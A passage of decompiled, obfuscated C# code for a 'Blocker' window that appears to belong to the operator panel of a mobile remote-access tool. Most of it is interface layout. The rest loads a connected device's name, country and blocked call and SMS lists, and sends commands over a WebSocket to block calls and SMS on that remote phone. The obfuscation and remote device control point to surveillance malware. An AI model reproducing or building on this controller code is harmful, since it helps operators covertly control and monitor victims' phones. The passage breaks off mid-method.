		this.DGV_SMS.Name = EXGuarder._0F04600C;
		this.DGV_SMS.ReadOnly = true;
		this.DGV_SMS.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle4.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle4.BackColor = System.Drawing.Color.FromArgb(45, 45, 45);
		dataGridViewCellStyle4.Font = new System.Drawing.Font(EXGuarder._3A761A16, 9f);
		dataGridViewCellStyle4.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle4.SelectionBackColor = System.Drawing.Color.FromArgb(64, 64, 64);
		dataGridViewCellStyle4.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle4.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV_SMS.RowHeadersDefaultCellStyle = dataGridViewCellStyle4;
		this.DGV_SMS.RowHeadersVisible = false;
		this.DGV_SMS.RowHeadersWidth = 51;
		dataGridViewCellStyle5.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle5.BackColor = System.Drawing.Color.FromArgb(45, 45, 45);
		dataGridViewCellStyle5.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle5.SelectionBackColor = System.Drawing.Color.FromArgb(64, 64, 64);
		dataGridViewCellStyle5.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle5.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV_SMS.RowsDefaultCellStyle = dataGridViewCellStyle5;
		this.DGV_SMS.RowTemplate.Height = 24;
		this.DGV_SMS.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.DGV_SMS.Size = new System.Drawing.Size(479, 625);
		this.DGV_SMS.TabIndex = 4;
		this.partclm.HeaderText = EXGuarder._18432E60;
		this.partclm.MinimumWidth = 6;
		this.partclm.Name = EXGuarder._5F062235;
		this.partclm.ReadOnly = true;
		this.adresclm.HeaderText = EXGuarder._3B0B361B;
		this.adresclm.MinimumWidth = 6;
		this.adresclm.Name = EXGuarder._040E594C;
		this.adresclm.ReadOnly = true;
		this.namclum.HeaderText = EXGuarder._6C313528;
		this.namclum.MinimumWidth = 6;
		this.namclum.Name = EXGuarder._1C4C1732;
		this.namclum.ReadOnly = true;
		this.dateclum.HeaderText = EXGuarder._19045D6F;
		this.dateclum.MinimumWidth = 6;
		this.dateclum.Name = EXGuarder._32154740;
		this.dateclum.ReadOnly = true;
		this.smspath.HeaderText = EXGuarder._55112E55;
		this.smspath.MinimumWidth = 6;
		this.smspath.Name = EXGuarder._12001738;
		this.smspath.ReadOnly = true;
		this.Panel6.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel6.Controls.Add(this.logtext);
		this.Panel6.Dock = System.Windows.Forms.DockStyle.Right;
		this.Panel6.Location = new System.Drawing.Point(487, 51);
		this.Panel6.Name = EXGuarder._6D27610C;
		this.Panel6.Padding = new System.Windows.Forms.Padding(9);
		this.Panel6.Size = new System.Drawing.Size(501, 633);
		this.Panel6.TabIndex = 56;
		this.logtext.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.logtext.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.logtext.Dock = System.Windows.Forms.DockStyle.Fill;
		this.logtext.Font = new System.Drawing.Font(EXGuarder._3A761A16, 9f);
		this.logtext.ForeColor = System.Drawing.SystemColors.Control;
		this.logtext.Location = new System.Drawing.Point(9, 9);
		this.logtext.Name = EXGuarder._74771842;
		this.logtext.ReadOnly = true;
		this.logtext.ScrollBars = System.Windows.Forms.RichTextBoxScrollBars.Vertical;
		this.logtext.Size = new System.Drawing.Size(483, 615);
		this.logtext.TabIndex = 54;
		this.logtext.Text = EXGuarder._71297204;
		this.Panel7.Controls.Add(this.activesms);
		this.Panel7.Controls.Add(this.DrakeWidth_W9);
		this.Panel7.Controls.Add(this.DrakeUIButtonIcon2);
		this.Panel7.Controls.Add(this.Combodats_sms);
		this.Panel7.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel7.Location = new System.Drawing.Point(0, 0);
		this.Panel7.Name = EXGuarder._0F583770;
		this.Panel7.Padding = new System.Windows.Forms.Padding(6, 5, 6, 5);
		this.Panel7.Size = new System.Drawing.Size(988, 51);
		this.Panel7.TabIndex = 44;
		this.activesms.CheckBoxColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.activesms.Cursor = System.Windows.Forms.Cursors.Hand;
		this.activesms.Dock = System.Windows.Forms.DockStyle.Left;
		this.activesms.Font = new System.Drawing.Font(EXGuarder._3A761A16, 9f, System.Drawing.FontStyle.Bold);
		this.activesms.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.activesms.Location = new System.Drawing.Point(215, 5);
		this.activesms.Name = EXGuarder._00054942;
		this.activesms.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.activesms.Size = new System.Drawing.Size(268, 41);
		this.activesms.Style = DrakeUI.Framework.UIStyle.Custom;
		this.activesms.TabIndex = 57;
		this.activesms.Text = EXGuarder._310E1103;
		this.DrakeWidth_W9.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W9.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeWidth_W9.Location = new System.Drawing.Point(200, 5);
		this.DrakeWidth_W9.Name = EXGuarder._3F21261E;
		this.DrakeWidth_W9.Size = new System.Drawing.Size(15, 41);
		this.DrakeWidth_W9.TabIndex = 58;
		this.DrakeUIButtonIcon2.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon2.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeUIButtonIcon2.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.DrakeUIButtonIcon2.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon2.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.DrakeUIButtonIcon2.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.DrakeUIButtonIcon2.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.DrakeUIButtonIcon2.Font = new System.Drawing.Font(EXGuarder._3A761A16, 9f);
		this.DrakeUIButtonIcon2.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.DrakeUIButtonIcon2.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.DrakeUIButtonIcon2.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.DrakeUIButtonIcon2.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.DrakeUIButtonIcon2.Location = new System.Drawing.Point(834, 5);
		this.DrakeUIButtonIcon2.Name = EXGuarder._2F145D33;
		this.DrakeUIButtonIcon2.Radius = 15;
		this.DrakeUIButtonIcon2.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.DrakeUIButtonIcon2.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon2.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.DrakeUIButtonIcon2.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.DrakeUIButtonIcon2.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.DrakeUIButtonIcon2.Size = new System.Drawing.Size(148, 41);
		this.DrakeUIButtonIcon2.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon2.Symbol = 61741;
		this.DrakeUIButtonIcon2.TabIndex = 48;
		this.DrakeUIButtonIcon2.Text = EXGuarder._45156E3E;
		this.Combodats_sms.Dock = System.Windows.Forms.DockStyle.Left;
		this.Combodats_sms.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.Combodats_sms.Enabled = false;
		this.Combodats_sms.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.Combodats_sms.Font = new System.Drawing.Font(EXGuarder._3A761A16, 9f);
		this.Combodats_sms.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
		this.Combodats_sms.Items.AddRange(new object[4]
		{
			EXGuarder._435B1B6C,
			EXGuarder._63125D4D,
			EXGuarder._28334858,
			EXGuarder._082F4264
		});
		this.Combodats_sms.Location = new System.Drawing.Point(6, 5);
		this.Combodats_sms.Margin = new System.Windows.Forms.Padding(4);
		this.Combodats_sms.MinimumSize = new System.Drawing.Size(56, 0);
		this.Combodats_sms.Name = EXGuarder._5D4C164A;
		this.Combodats_sms.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
		this.Combodats_sms.Radius = 15;
		this.Combodats_sms.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.Combodats_sms.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.Combodats_sms.Size = new System.Drawing.Size(194, 25);
		this.Combodats_sms.Style = DrakeUI.Framework.UIStyle.Custom;
		this.Combodats_sms.TabIndex = 52;
		this.Combodats_sms.Text = EXGuarder._79261B75;
		this.Combodats_sms.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.panelcalls.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.panelcalls.Controls.Add(this.DGVCALLS);
		this.panelcalls.Controls.Add(this.Panel3);
		this.panelcalls.Dock = System.Windows.Forms.DockStyle.Fill;
		this.panelcalls.Location = new System.Drawing.Point(0, 0);
		this.panelcalls.Name = EXGuarder._3F54532D;
		this.panelcalls.Size = new System.Drawing.Size(988, 684);
		this.panelcalls.TabIndex = 0;
		this.DGVCALLS.AllowUserToAddRows = false;
		this.DGVCALLS.AllowUserToDeleteRows = false;
		this.DGVCALLS.AllowUserToResizeColumns = false;
		this.DGVCALLS.AllowUserToResizeRows = false;
		dataGridViewCellStyle6.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle6.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle6.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle6.SelectionBackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle6.SelectionForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		dataGridViewCellStyle6.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.DGVCALLS.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle6;
		this.DGVCALLS.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
		this.DGVCALLS.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
		this.DGVCALLS.BackgroundColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DGVCALLS.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.DGVCALLS.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.DGVCALLS.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
		this.DGVCALLS.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
		dataGridViewCellStyle7.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle7.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle7.Font = new System.Drawing.Font(EXGuarder._3A761A16, 9f);
		dataGridViewCellStyle7.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle7.SelectionBackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle7.SelectionForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		dataGridViewCellStyle7.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.DGVCALLS.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle7;
		this.DGVCALLS.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.DGVCALLS.Columns.AddRange(this.apicoclm, this.numnamclm, this.numculm, this.acctclum, this.instlclum);
		dataGridViewCellStyle8.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle8.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle8.Font = new System.Drawing.Font(EXGuarder._3A761A16, 9f);
		dataGridViewCellStyle8.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle8.SelectionBackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle8.SelectionForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		dataGridViewCellStyle8.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.DGVCALLS.DefaultCellStyle = dataGridViewCellStyle8;
		this.DGVCALLS.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DGVCALLS.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
		this.DGVCALLS.EnableHeadersVisualStyles = false;
		this.DGVCALLS.GridColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DGVCALLS.Location = new System.Drawing.Point(0, 51);
		this.DGVCALLS.MultiSelect = false;
		this.DGVCALLS.Name = EXGuarder._16572A4D;
		this.DGVCALLS.ReadOnly = true;
		this.DGVCALLS.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle9.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle9.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle9.Font = new System.Drawing.Font(EXGuarder._3A761A16, 9f);
		dataGridViewCellStyle9.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle9.SelectionBackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle9.SelectionForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		dataGridViewCellStyle9.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.DGVCALLS.RowHeadersDefaultCellStyle = dataGridViewCellStyle9;
		this.DGVCALLS.RowHeadersVisible = false;
		this.DGVCALLS.RowHeadersWidth = 51;
		dataGridViewCellStyle10.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle10.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle10.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle10.SelectionBackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle10.SelectionForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		dataGridViewCellStyle10.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.DGVCALLS.RowsDefaultCellStyle = dataGridViewCellStyle10;
		this.DGVCALLS.RowTemplate.Height = 24;
		this.DGVCALLS.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.DGVCALLS.Size = new System.Drawing.Size(988, 633);
		this.DGVCALLS.TabIndex = 42;
		this.apicoclm.FillWeight = 4.812834f;
		this.apicoclm.HeaderText = EXGuarder._4973352A;
		this.apicoclm.ImageLayout = System.Windows.Forms.DataGridViewImageCellLayout.Zoom;
		this.apicoclm.MinimumWidth = 6;
		this.apicoclm.Name = EXGuarder._35591559;
		this.apicoclm.ReadOnly = true;
		this.numnamclm.FillWeight = 21.29679f;
		this.numnamclm.HeaderText = EXGuarder._443D1D55;
		this.numnamclm.MinimumWidth = 6;
		this.numnamclm.Name = EXGuarder._2D606127;
		this.numnamclm.ReadOnly = true;
		this.numculm.FillWeight = 21.29679f;
		this.numculm.HeaderText = EXGuarder._4353370E;
		this.numculm.MinimumWidth = 6;
		this.numculm.Name = EXGuarder._3514625C;
		this.numculm.ReadOnly = true;
		this.acctclum.FillWeight = 21.29679f;
		this.acctclum.HeaderText = EXGuarder._6E345C4A;
		this.acctclum.MinimumWidth = 6;
		this.acctclum.Name = EXGuarder._136F0510;
		this.acctclum.ReadOnly = true;
		this.instlclum.FillWeight = 21.29679f;
		this.instlclum.HeaderText = EXGuarder._524B3C4A;
		this.instlclum.MinimumWidth = 6;
		this.instlclum.Name = EXGuarder._34444E5D;
		this.instlclum.ReadOnly = true;
		this.Panel3.Controls.Add(this.activecalls);
		this.Panel3.Controls.Add(this.refbtm);
		this.Panel3.Controls.Add(this.DrakeWidth_W4);
		this.Panel3.Controls.Add(this.Combodats_calls);
		this.Panel3.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel3.Location = new System.Drawing.Point(0, 0);
		this.Panel3.Name = EXGuarder._0501582B;
		this.Panel3.Padding = new System.Windows.Forms.Padding(6, 5, 6, 5);
		this.Panel3.Size = new System.Drawing.Size(988, 51);
		this.Panel3.TabIndex = 43;
		this.activecalls.CheckBoxColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.activecalls.Cursor = System.Windows.Forms.Cursors.Hand;
		this.activecalls.Dock = System.Windows.Forms.DockStyle.Left;
		this.activecalls.Font = new System.Drawing.Font(EXGuarder._3A761A16, 9f, System.Drawing.FontStyle.Bold);
		this.activecalls.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.activecalls.Location = new System.Drawing.Point(215, 5);
		this.activecalls.Name = EXGuarder._593E1720;
		this.activecalls.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.activecalls.Size = new System.Drawing.Size(268, 41);
		this.activecalls.Style = DrakeUI.Framework.UIStyle.Custom;
		this.activecalls.TabIndex = 57;
		this.activecalls.Text = EXGuarder._310E1103;
		this.refbtm.Cursor = System.Windows.Forms.Cursors.Hand;
		this.refbtm.Dock = System.Windows.Forms.DockStyle.Right;
		this.refbtm.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.refbtm.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.refbtm.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.refbtm.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.refbtm.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.refbtm.Font = new System.Drawing.Font(EXGuarder._3A761A16, 9f);
		this.refbtm.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.refbtm.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.refbtm.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.refbtm.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.refbtm.Location = new System.Drawing.Point(834, 5);
		this.refbtm.Name = EXGuarder._673B3B24;
		this.refbtm.Radius = 15;
		this.refbtm.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.refbtm.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.refbtm.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.refbtm.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.refbtm.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.refbtm.Size = new System.Drawing.Size(148, 41);
		this.refbtm.Style = DrakeUI.Framework.UIStyle.Custom;
		this.refbtm.Symbol = 61741;
		this.refbtm.TabIndex = 48;
		this.refbtm.Text = EXGuarder._18581F50;
		this.DrakeWidth_W4.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W4.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeWidth_W4.Location = new System.Drawing.Point(200, 5);
		this.DrakeWidth_W4.Name = EXGuarder._07372A0E;
		this.DrakeWidth_W4.Size = new System.Drawing.Size(15, 41);
		this.DrakeWidth_W4.TabIndex = 52;
		this.Combodats_calls.Dock = System.Windows.Forms.DockStyle.Left;
		this.Combodats_calls.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.Combodats_calls.Enabled = false;
		this.Combodats_calls.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.Combodats_calls.Font = new System.Drawing.Font(EXGuarder._3A761A16, 9f);
		this.Combodats_calls.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
		this.Combodats_calls.Items.AddRange(new object[4]
		{
			EXGuarder._435B1B6C,
			EXGuarder._63125D4D,
			EXGuarder._28334858,
			EXGuarder._082F4264
		});
		this.Combodats_calls.Location = new System.Drawing.Point(6, 5);
		this.Combodats_calls.Margin = new System.Windows.Forms.Padding(4);
		this.Combodats_calls.MinimumSize = new System.Drawing.Size(56, 0);
		this.Combodats_calls.Name = EXGuarder._190D0909;
		this.Combodats_calls.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
		this.Combodats_calls.Radius = 15;
		this.Combodats_calls.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.Combodats_calls.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.Combodats_calls.Size = new System.Drawing.Size(194, 25);
		this.Combodats_calls.Style = DrakeUI.Framework.UIStyle.Custom;
		this.Combodats_calls.TabIndex = 51;
		this.Combodats_calls.Text = EXGuarder._79261B75;
		this.Combodats_calls.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 18f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		base.ClientSize = new System.Drawing.Size(992, 814);
		base.Controls.Add(this.panelcenter);
		base.Controls.Add(this.Panel2);
		base.Icon = (System.Drawing.Icon)resources.GetObject(EXGuarder._3A156A50);
		base.Name = EXGuarder._46220201;
		this.Text = EXGuarder._46220201;
		base.Controls.SetChildIndex(this.tobpanelsti, 0);
		base.Controls.SetChildIndex(this.Panel2, 0);
		base.Controls.SetChildIndex(this.panelcenter, 0);
		((System.ComponentModel.ISupportInitialize)this.myscr).EndInit();
		((System.ComponentModel.ISupportInitialize)this.myico).EndInit();
		this.tobpanelsti.ResumeLayout(false);
		this.Panel2.ResumeLayout(false);
		this.TableLayoutPanel3.ResumeLayout(false);
		this.panelcenter.ResumeLayout(false);
		this.panelsms.ResumeLayout(false);
		this.Panel5.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.DGV_SMS).EndInit();
		this.Panel6.ResumeLayout(false);
		this.Panel7.ResumeLayout(false);
		this.panelcalls.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.DGVCALLS).EndInit();
		this.Panel3.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	private void SetActiveNav(int index)
	{
		Color color = Color.FromArgb(2, 176, 117);
		Color color2 = Color.FromArgb(145, 163, 182);
		nav1btn.ForeColor = color2;
		nav1btn.RectColor = color2;
		nav2btn.ForeColor = color2;
		nav2btn.RectColor = color2;
		switch (index)
		{
		case 0:
			nav1btn.ForeColor = color;
			nav1btn.RectColor = color;
			break;
		case 1:
			nav2btn.ForeColor = color;
			nav2btn.RectColor = color;
			break;
		}
	}

	private void nav1btn_Click(object sender, EventArgs e)
	{
		panelcalls.BringToFront();
		SetActiveNav(0);
	}

	private void nav2btn_Click(object sender, EventArgs e)
	{
		panelsms.BringToFront();
		SetActiveNav(1);
	}

	private void DataGridView1_CellPainting(object sender, DataGridViewCellPaintingEventArgs e)
	{
		DataGridView dataGridView = (DataGridView)sender;
		if (e.RowIndex < 0 || e.ColumnIndex < 0)
		{
			return;
		}
		e.Handled = true;
		e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
		Rectangle cellBounds = e.CellBounds;
		cellBounds.Inflate(0, -2);
		using (SolidBrush brush = new SolidBrush(Color.FromArgb(6, 10, 15)))
		{
			e.Graphics.FillRectangle(brush, e.CellBounds);
		}
		int radius = 15;
		GraphicsPath graphicsPath = null;
		int columnIndex = e.ColumnIndex;
		checked
		{
			int num = dataGridView.ColumnCount - 1;
			if (columnIndex == 0)
			{
				DGV_SMS.Rows[e.RowIndex].Cells[0].Style.Padding = new Padding(0);
				graphicsPath = codes.GetRoundedRectanglePath(cellBounds, radius, roundTopLeft: true, roundTopRight: false, roundBottomRight: false);
			}
			else if (columnIndex == num)
			{
				graphicsPath = codes.GetRoundedRectanglePath(cellBounds, radius, roundTopLeft: false, roundTopRight: true, roundBottomRight: true, roundBottomLeft: false);
			}
			else
			{
				graphicsPath = new GraphicsPath();
				graphicsPath.AddRectangle(cellBounds);
			}
			Color color = default(Color);
			Color color2;
			if (dataGridView.Rows[e.RowIndex].Selected)
			{
				color = Color.FromArgb(14, 22, 33);
				color2 = Color.FromArgb(2, 176, 117);
			}
			else
			{
				Color foreColor = dataGridView.Rows[e.RowIndex].Cells[e.ColumnIndex].Style.ForeColor;
				color2 = ((!foreColor.IsEmpty) ? foreColor : Color.FromArgb(145, 163, 182));
			}
			using (SolidBrush brush2 = new SolidBrush(color))
			{
				using Pen pen = new Pen(color);
				e.Graphics.FillPath(brush2, graphicsPath);
				e.Graphics.DrawPath(pen, graphicsPath);
			}
			if (e.Value != null && e.Value is Image)
			{
				Image image = (Image)e.Value;
				Rectangle rect = new Rectangle(cellBounds.X + unchecked(checked(cellBounds.Width - image.Width) / 2), cellBounds.Y + unchecked(checked(cellBounds.Height - image.Height) / 2), image.Width, image.Height);
				e.Graphics.DrawImage(image, rect);
			}
			else
			{
				if (e.Value == null)
				{
					return;
				}
				if (e.Value is bool)
				{
					bool flag = Conversions.ToBoolean(e.Value);
					int num2 = 14;
					Rectangle rect2 = new Rectangle(cellBounds.X + unchecked(checked(cellBounds.Width - num2) / 2), cellBounds.Y + unchecked(checked(cellBounds.Height - num2) / 2), num2, num2);
					using (Pen pen2 = new Pen(color2, 2f))
					{
						e.Graphics.DrawRectangle(pen2, rect2);
					}
					if (flag)
					{
						GraphicsPath graphicsPath2 = new GraphicsPath();
						graphicsPath2.AddLines(new Point[3]
						{
							new Point(rect2.Left + 3, rect2.Top + unchecked(num2 / 2)),
							new Point(rect2.Left + unchecked(num2 / 2) - 1, rect2.Bottom - 3),
							new Point(rect2.Right - 3, rect2.Top + 3)
						});
						using Pen pen3 = new Pen(color2, 2f);
						e.Graphics.DrawPath(pen3, graphicsPath2);
					}
				}
				else
				{
					TextRenderer.DrawText(e.Graphics, e.FormattedValue.ToString(), e.CellStyle.Font, cellBounds, color2, TextFormatFlags.HorizontalCenter | TextFormatFlags.VerticalCenter | TextFormatFlags.WordBreak);
				}
			}
		}
	}

	public Bitmap getcallicon(string Strcall)
	{
		if (Operators.CompareString(Strcall, EXGuarder._72220D0B, TextCompare: false) != 0)
		{
			if (Operators.CompareString(Strcall, EXGuarder._08053851, TextCompare: false) == 0)
			{
				return (Bitmap)new Bitmap(Resources.outcall).Clone();
			}
			return (Bitmap)new Bitmap(Resources.unkowncall).Clone();
		}
		return (Bitmap)new Bitmap(Resources.incall).Clone();
	}

	private void DGV0_SelectionChanged(object sender, EventArgs e)
	{
		if (DGV_SMS.SelectedRows.Count == 1)
		{
			logtext.Text = DGV_SMS.SelectedRows[0].Tag.ToString();
		}
	}

	private void refbtm_Click(object sender, EventArgs e)
	{
		if (MyMsg.Show(BTConst.confdelestr, BTConst.confdelcallsstr, MyMsg.msgtype.Confirm, use_no: true, showskip: false, EXGuarder._156D5638) == DialogResult.OK)
		{
			Dictionary<string, object> dictionary = new Dictionary<string, object>();
			dictionary.Add(EXGuarder._704E573B, BTConst.blkercom);
			dictionary.Add(EXGuarder._190F5B11, EXGuarder._3761660A);
			dictionary.Add(EXGuarder._61144667, EXGuarder._46726A3D);
			Dictionary<string, object> chatData = dictionary;
			BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
		}
	}

	private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
	{
		if (MyMsg.Show(BTConst.confdelestr, BTConst.confdelsmssstr, MyMsg.msgtype.Confirm, use_no: true, showskip: false, EXGuarder._176B2721) == DialogResult.OK)
		{
			Dictionary<string, object> dictionary = new Dictionary<string, object>();
			dictionary.Add(EXGuarder._4E024E58, BTConst.blkercom);
			dictionary.Add(EXGuarder._6D074954, EXGuarder._1C385131);
			dictionary.Add(EXGuarder._6B615429, EXGuarder._01251146);
			Dictionary<string, object> chatData = dictionary;
			BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
		}
	}

	private void Blocker_Load(object sender, EventArgs e)
	{
		codes.SetDoubleBuffered(DGVCALLS);
		codes.SetDoubleBuffered(DGV_SMS);
		panelcalls.BringToFront();
		mytitle.Text = string.Format(EXGuarder._48125927, Btcli.name, Btcli.country, BTConst.smscallblkstr);
		string[] array = Btcli.BlockedCalls.Split(new string[1] { EXGuarder._4B30116E }, StringSplitOptions.None);
		if (Operators.CompareString(Btcli.BlockedCalls, EXGuarder._6A610203, TextCompare: false) == 0 || array.Length < 1)
		{
			Combodats_calls.Text = EXGuarder._20247461;
			Combodats_calls.Enabled = false;
			BTAlerter.infos(BTConst.blkcallnostr);
		}
		else
		{
			Combodats_calls.Items.Clear();
			string[] array2 = array;
			foreach (string item in array2)
			{
				Combodats_calls.Items.Add(item);
			}
			Combodats_calls.Text = EXGuarder._20247461;
			Combodats_calls.Enabled = true;
		}
		string[] array3 = Btcli.BlockedSMS.Split(new string[1] { EXGuarder._4B30116E }, StringSplitOptions.None);
		if (Operators.CompareString(Btcli.BlockedSMS, EXGuarder._6A610203, TextCompare: false) == 0 || array3.Length < 1)
		{
			Combodats_sms.Text = EXGuarder._20247461;
			Combodats_sms.Enabled = false;
			BTAlerter.infos(BTConst.blksmsnostr);
		}
		else
		{
			Combodats_sms.Items.Clear();
			string[] array4 = array3;
			foreach (string item2 in array4)
			{
				Combodats_sms.Items.Add(item2);
			}
			Combodats_calls.Text = EXGuarder._20247461;
			Combodats_sms.Enabled = true;
